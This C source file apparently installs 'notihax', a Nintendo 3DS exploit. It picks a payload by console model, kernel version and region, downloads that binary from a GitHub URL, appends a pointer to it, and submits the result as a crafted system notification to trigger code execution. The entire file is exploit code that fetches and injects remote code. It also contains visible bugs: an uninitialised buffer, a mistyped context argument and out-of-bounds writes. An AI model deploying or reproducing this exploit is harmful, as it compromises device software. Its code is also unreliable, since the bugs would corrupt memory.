#include <3ds.h>

// Code from examples/3ds/http/source/main.c
Result http_download(httpcContext *context, u8* out, u32* bytes_downloaded)
{
	Result ret=0;
	u8* framebuf_top;
	u32 statuscode=0;
	u32 contentsize=0;

    printf("Beginning request...\n");
	ret = httpcBeginRequest(context);
	if(ret!=0)return ret;

    printf("Retrieving status code...\n");
	ret = httpcGetResponseStatusCode(&context, &statuscode, 0);
	// if(ret!=0)return ret;

    printf("Retreived status code ...\n");
	if(statuscode!=200)return statuscode;

    printf("Preparing to download data...\n");
	ret=httpcGetDownloadSizeState(context, NULL, &contentsize);
	if(ret!=0)return ret;

	gfxFlushBuffers();

	memset(out, 0, contentsize);

    printf("Downloading data...\n");
	ret = httpcDownloadData(context, out, contentsize, NULL);
	if(ret!=0)
	{
		return ret;
	}

	return 0;
}

int main(int argc, char** argv)
{
    gfxInitDefault();
    consoleInit(GFX_TOP, NULL);
    aptInit();
    httpcInit(0);

    printf("Ready to install notihax! Press A to install, press any other key to exit.\n");

    while(aptMainLoop())
    {
        hidScanInput();

        if(hidKeysDown())
        {
            if(hidKeysDown() & KEY_A) {
                break;
            } else {
                return 0;
            }
        }
    }

    u8 n3ds;
    APT_CheckNew3DS(&n3ds);

    u32 kver = osGetKernelVersion();
    printf("kver:      %08x\n", kver);
    printf("sysverraw: %1u %2u %2u\n", GET_VERSION_MAJOR(kver), GET_VERSION_MINOR(kver), GET_VERSION_REVISION(kver));

	OS_VersionBin version;
	osGetSystemVersionData(&version, NULL);

    char payload_loc[84];
    sprintf(payload_loc, "https://raw.githubusercontent.com/TechNick6425/notihax/master/payloads/%s%08x%s.bin", (n3ds != 0 ? "n" : "o"), kver, version.region);

    printf("\nDownloading payload...\n");

    httpcContext context;
    httpcOpenContext(&context, HTTPC_METHOD_GET, payload_loc, 1);

    u32 bytes;
    u8* buffer;
    u32 i;
    switch((i = http_download(&context, buffer, &bytes)))
    {
    case 0:
        break;
    default:
        printf("%u: %s", i, payload_loc);
        return i;
    }

    printf("Building haxxed notification...\n");

    u8 title_payload[bytes + 4];

    for(int i = 0; i < bytes; i++)
    {
        title_payload[i] = buffer[i];
    }

    printf("Attaching stack pointer...\n");
    title_payload[bytes + 1] = (u8) ((((u32) buffer) >> 24) & 0xFF);
    title_payload[bytes + 2] = (u8) ((((u32) buffer) >> 16) & 0xFF);
    title_payload[bytes + 3] = (u8) ((((u32) buffer) >> 8 ) & 0xFF);
    title_payload[bytes + 4] = (u8) ((((u32) buffer)      ) & 0xFF);

    printf("Submitting haxxed notification...\n");
    newsInit();
    NEWS_AddNotification((u16*)&title_payload, bytes, (u16*)&title_payload, bytes, (u16*)&title_payload, bytes, false);

    printf("Injected haxxed notification!\n");

    while(aptMainLoop())
    {
        hidScanInput();

        if(hidKeysDown())
        {
            break;
        }
    }

    aptExit();
    httpcExit();
	gfxExit();
    newsExit();
}
